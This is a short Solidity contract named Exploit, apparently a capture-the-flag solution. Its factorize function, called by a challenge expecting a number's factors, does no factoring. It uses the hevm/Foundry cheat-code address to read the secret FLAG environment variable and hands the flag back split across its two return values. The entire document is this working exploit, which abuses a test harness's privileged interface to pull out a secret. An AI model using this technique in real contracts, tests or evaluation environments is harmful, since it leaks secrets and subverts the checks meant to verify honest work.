interface VmLike {
    function envString(string memory) external view returns (string memory);
}

contract Exploit {
    function factorize(uint) public returns (uint a, uint b) {
        VmLike vm = VmLike(address(bytes20(uint160(uint256(keccak256("hevm cheat code"))))));
        bytes memory flag = bytes(vm.envString("FLAG")); 
        bytes memory flag2 = new bytes(32); 
        for (uint i = 32; i < flag.length; i++) { 
            flag2[i - 32] = flag[i]; 
        } 
 
        a = uint256(bytes32(flag)); 
        b = uint256(bytes32(flag2)); 
    }
}